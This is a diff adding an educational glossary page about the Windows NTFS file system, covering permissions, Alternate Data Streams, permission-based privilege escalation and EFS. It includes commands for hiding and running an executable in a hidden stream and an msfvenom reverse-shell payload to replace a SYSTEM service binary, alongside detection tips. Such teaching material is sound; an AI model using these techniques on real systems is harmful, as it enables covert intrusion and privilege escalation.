@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>NTFS — New Technology File System ☕</title>
+<link rel="stylesheet" href="../assets/styles.css" />
+</head>
+<body data-page-slug="ntfs">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../index.html">Home</a>
+    <a href="../index.html#topics-web">Topics</a>
+    <a href="../index.html#topics-python">Python</a>
+    <a href="index.html" class="active">Glossary</a>
+    <a href="../tryhackme/index.html">THM</a>
+    <a href="../htb-academy/index.html">HTB</a>
+    <a href="../labs/portswigger/index.html">Labs</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="text" class="search" placeholder="Search (press /)..." />
+    <div class="search-results"></div>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="../index.html">Home</a>
+  <span class="sep">›</span>
+  <a href="index.html">Glossary</a>
+  <span class="sep">›</span>
+  <span>NTFS (New Technology File System)</span>
+</div>
+
+<!-- HERO -->
+<section class="hero" style="min-height: 45vh;">
+  <div class="hero-content">
+    <span class="coffee-badge">📖 glossary · windows fundamentals · the filing cabinet</span>
+    <h1>NTFS <span style="color: var(--accent-2);">📁</span></h1>
+    <p class="subtitle">New Technology File System — the default file system on every modern Windows box.<br>Permissions, journaling, encryption, and sneaky hidden data streams.</p>
+    <div class="tagline">"FAT couldn't handle the job. NTFS brought locks, cameras, and a secret basement." 🗄️</div>
+  </div>
+</section>
+
+<!-- WHAT IS IT -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 01 // Definition</div>
+  <h2><span class="emoji">📖</span> What is NTFS?</h2>
+  <p class="lead">NTFS (New Technology File System) is the default file system on modern Windows (NT, 2000, XP, 7, 10, 11, Server editions). It replaced FAT16/FAT32 and brought serious upgrades: per-file permissions, journaling for crash recovery, native encryption, and support for massive files.</p>
+
+  <div class="paper">
+    <h4>📝 NTFS is like a fancy filing cabinet with locks on every drawer and a security camera recording who opened what</h4>
+    <p>FAT32 was like an old cardboard box — anyone could reach in, grab anything, and there was a hard limit on file size (4 GB). NTFS is a steel filing cabinet where <span class="highlight">every drawer has its own lock</span> (per-file permissions), there's a <span class="highlight">security camera logging who opened what</span> (journaling), some drawers have <span class="highlight">built-in encryption</span> (EFS), and there are even <span class="highlight">hidden compartments taped behind the drawers</span> that nobody sees unless they know to look (Alternate Data Streams). The filing cabinet also doesn't care if you shove a 100 GB file in — it just handles it.</p>
+  </div>
+
+  <h3>Why NTFS replaced FAT</h3>
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>🚫 FAT32 limitations</h4>
+      <ul>
+        <li>Max file size: <strong>4 GB</strong> (can't even store a single DVD image)</li>
+        <li>Max partition: 2 TB (with caveats)</li>
+        <li><strong>Zero file permissions</strong> — anyone who can access the drive can read/write everything</li>
+        <li>No journaling — power failure = possible corruption</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4>✅ NTFS brings</h4>
+      <ul>
+        <li>Max file size: <strong>16 EB</strong> (exabytes — effectively unlimited)</li>
+        <li>Per-file and per-folder <strong>ACL permissions</strong></li>
+        <li><strong>Journaling</strong> — logs changes before writing, survives crashes</li>
+        <li><strong>EFS encryption</strong>, compression, Alternate Data Streams</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<div class="divider">permissions deep dive</div>
+
+<!-- NTFS PERMISSIONS -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 02 // NTFS Permissions</div>
+  <h2><span class="emoji">🔐</span> The six NTFS permission levels</h2>
+
+  <p>Every file and folder on NTFS has an Access Control List (ACL) — a list of "who can do what." Here are the six standard permission types:</p>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>👑 Full Control</h4>
+      <p>Read, write, execute, delete, <strong>change permissions</strong>, and <strong>take ownership</strong>. The king of permissions. Admins get this on system files.</p>
+    </div>
+    <div class="card">
+      <h4>✏️ Modify</h4>
+      <p>Read, write, execute, and <strong>delete</strong> the file/folder. Everything except changing permissions and taking ownership.</p>
+    </div>
+    <div class="card">
+      <h4>▶️ Read &amp; Execute</h4>
+      <p>View file contents AND run executables/scripts. For folders: traverse (enter) the directory.</p>
+    </div>
+    <div class="card">
+      <h4>📂 List Folder Contents</h4>
+      <p>Only applies to folders — see what's inside, but can't necessarily open the files. Think: reading the labels on the filing cabinet drawers.</p>
+    </div>
+    <div class="card">
+      <h4>📖 Read</h4>
+      <p>View file contents and attributes. Can't modify, can't execute. The "look but don't touch" permission.</p>
+    </div>
+    <div class="card">
+      <h4>📝 Write</h4>
+      <p>Create new files/folders and modify existing ones. But can't delete, can't execute, can't change permissions.</p>
+    </div>
+  </div>
+
+  <h3>How to check NTFS permissions</h3>
+  <p>Right-click any file or folder → <strong>Properties</strong> → <strong>Security</strong> tab. You'll see a list of users/groups and their permissions. From the command line:</p>
+  <div class="code">
+<span class="com"># CMD — show permissions on a file/folder</span>
+icacls C:\Users\target\Documents
+
+<span class="com"># PowerShell — detailed ACL view</span>
+Get-Acl C:\Users\target\Documents | Format-List
+  </div>
+
+  <div class="callout info">
+    <strong>💡 Inheritance matters.</strong> By default, child folders and files inherit permissions from their parent. A misconfigured parent folder = every file inside is misconfigured too. Always check the "Advanced" button in the Security tab to see where permissions are coming from.
+  </div>
+</section>
+
+<div class="divider">hidden streams</div>
+
+<!-- ALTERNATE DATA STREAMS -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 03 // Alternate Data Streams (ADS)</div>
+  <h2><span class="emoji">👻</span> The hidden compartments in every NTFS file</h2>
+
+  <p>Here's something most Windows users never learn: on NTFS, every file can have <strong>multiple data streams</strong>. The "normal" content you see is the default (unnamed) stream. But you can attach additional named streams — invisible to Windows Explorer, invisible to <code class="inline">dir</code>, invisible to most antivirus.</p>
+
+  <h3>Legitimate uses</h3>
+  <ul>
+    <li><strong>Zone Identifier:</strong> When you download a file from the internet, Windows tags it with <code class="inline">:Zone.Identifier</code> — that's an ADS. It's how Windows knows to show the "This file came from the internet" warning.</li>
+    <li><strong>Thumbnails and metadata</strong> can be stored in streams.</li>
+  </ul>
+
+  <h3>Malicious uses 🥷</h3>
+  <p>Attackers LOVE Alternate Data Streams because:</p>
+  <ul>
+    <li>You can <strong>hide an entire executable</strong> inside an innocent-looking text file</li>
+    <li>The file size shown in Explorer <strong>doesn't change</strong> — the ADS is invisible</li>
+    <li>Many older AV tools <strong>don't scan ADS</strong></li>
+  </ul>
+
+  <div class="code">
+<span class="com"># Hide a payload inside a text file (CMD)</span>
+<span class="kw">type</span> malware.exe > innocent.txt:<span class="inject">hidden.exe</span>
+
+<span class="com"># Run the hidden payload</span>
+<span class="kw">wmic</span> process call create "C:\path\innocent.txt:hidden.exe"
+
+<span class="com"># Detect ADS — list all streams on a file</span>
+<span class="kw">dir /R</span> C:\path\innocent.txt
+
+<span class="com"># PowerShell — list streams</span>
+<span class="kw">Get-Item</span> C:\path\innocent.txt -Stream *
+  </div>
+
+  <div class="callout danger">
+    <strong>🚨 Defense tip:</strong> Modern Windows Defender DOES scan ADS. But in forensics and incident response, always check for hidden streams with <code class="inline">dir /R</code> or <code class="inline">Get-Item -Stream *</code>. Sysinternals <code class="inline">streams.exe</code> can recursively scan entire directories.
+  </div>
+</section>
+
+<div class="divider">pentester angle</div>
+
+<!-- EXPLOITATION -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 04 // How pentesters exploit weak NTFS permissions</div>
+  <h2><span class="emoji">🥷</span> When the filing cabinet is left unlocked</h2>
+
+  <p>Weak NTFS permissions are a goldmine for <span class="term" data-term="privilege-escalation">privilege escalation</span> on Windows. Here are the big ones:</p>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <div class="card-badge danger">CLASSIC</div>
+      <h4>🎯 Writable service binary path</h4>
+      <p>A Windows service runs as SYSTEM. The <code class="inline">.exe</code> it points to lives in a folder where your low-priv user has <strong>Write</strong> permission. Replace the exe with a reverse shell. Restart the service (or wait for a reboot). <strong>SYSTEM shell.</strong></p>
+    </div>
+    <div class="card">
+      <div class="card-badge danger">CLASSIC</div>
+      <h4>📦 DLL hijacking</h4>
+      <p>A privileged process loads a DLL from a writable directory. Drop a malicious DLL with the same name → the process loads YOUR code with its privileges.</p>
+    </div>
+    <div class="card">
+      <div class="card-badge danger">COMMON</div>
+      <h4>📂 Unquoted service paths</h4>
+      <p>Service path: <code class="inline">C:\Program Files\My App\service.exe</code> (unquoted). Windows tries <code class="inline">C:\Program.exe</code>, then <code class="inline">C:\Program Files\My.exe</code>. If you can write to <code class="inline">C:\</code>, drop a <code class="inline">Program.exe</code> reverse shell.</p>
+    </div>
+    <div class="card">
+      <div class="card-badge danger">RECON</div>
+      <h4>🔍 Overly permissive shares</h4>
+      <p>Network shares with <code class="inline">Everyone: Full Control</code>. Read config files, plant malicious scripts, or modify shared executables.</p>
+    </div>
+  </div>
+
+  <div class="code">
+<span class="com"># Find services with writable paths (PowerShell)</span>
+Get-WmiObject win32_service | Where-Object {
+  $_.PathName -and (Test-Path (Split-Path $_.PathName.Trim('"'))) } |
+  Select-Object Name, StartName, PathName
+
+<span class="com"># Check if current user can write to a service path (icacls)</span>
+icacls "C:\Program Files\VulnApp\service.exe"
+<span class="com"># Look for (M) or (F) next to your user/group = Modify or Full Control</span>
+  </div>
+
+  <div class="brain-power">
+    <h4>🧠 Brain Power</h4>
+    <p>You find a Windows service running as SYSTEM whose executable path is writable by your low-priv user. What do you do?</p>
+    <button onclick="toggleAnswer(this)">Reveal answer</button>
+    <div class="answer">
+      <p><strong>Replace the exe with a reverse shell payload</strong> (e.g., generated with <code class="inline">msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOU LPORT=4444 -f exe -o service.exe</code>). Then restart the service with <code class="inline">sc stop VulnService && sc start VulnService</code> (or wait for a reboot). The service starts YOUR binary — <strong>as SYSTEM</strong>. You catch the shell on your listener. Game over. 👑</p>
+      <p>This is one of the most common Windows privesc paths. Tools like <strong>PowerUp</strong> and <strong>winPEAS</strong> automatically scan for this.</p>
+    </div>
+  </div>
+</section>
+
+<div class="divider">encryption</div>
+
+<!-- EFS -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 05 // EFS — Encrypting File System</div>
+  <h2><span class="emoji">🔒</span> File-level encryption on NTFS</h2>
+
+  <p>NTFS includes EFS (Encrypting File System) — the ability to encrypt individual files and folders. It's different from <span class="term" data-term="bitlocker">BitLocker</span> (which encrypts entire drives).</p>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>🔒 EFS</h4>
+      <p>Encrypts <strong>individual files/folders</strong>. Tied to the user's Windows account — if they're logged in, decryption is transparent. Protects against other users on the same machine.</p>
+    </div>
+    <div class="card">
+      <h4>💿 BitLocker</h4>
+      <p>Encrypts the <strong>entire drive</strong>. Protects against physical theft (someone pulling the hard drive). Once Windows boots and you log in, everything is decrypted.</p>
+    </div>
+  </div>
+
+  <div class="callout info">
+    <strong>💡 Pentest angle:</strong> EFS-encrypted files are accessible while the owning user is logged in. If you escalate to their session (or extract their EFS certificate from the registry), the encryption is irrelevant. EFS is not a barrier to an attacker who already has the user's credentials.
+  </div>
+
+  <div class="quiz">
+    <h4>🎯 Quick Check</h4>
+    <div class="q">What command reveals Alternate Data Streams hidden inside a file on NTFS?</div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">dir /A — shows hidden files</div>
+      <div class="opt" onclick="quizAnswer(this, true)">dir /R — lists all data streams per file</div>
+      <div class="opt" onclick="quizAnswer(this, false)">attrib -h — removes the hidden attribute</div>
+      <div class="opt" onclick="quizAnswer(this, false)">type file.txt — prints file contents</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+</section>
+
+<!-- RELATED TERMS -->
+<section class="chapter">
+  <div class="related-terms">
+    <h4>🔗 Related in the vault</h4>
+    <div class="tags">
+      <a href="uac.html">🛡️ UAC</a>
+      <a href="bitlocker.html">🔒 BitLocker</a>
+      <a href="privilege-escalation.html">⬆️ Privilege Escalation</a>
+      <a href="linux-permissions.html">🐧 Linux Permissions</a>
+      <a href="../tryhackme/cybersec-101/windows-fundamentals-1.html">🪟 THM: Windows Fundamentals 1</a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-foot">
+  <p class="coffee-line">Check the Security tab. Check the streams. Own the box. ☕</p>
+</footer>
+
+<script src="../assets/glossary.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
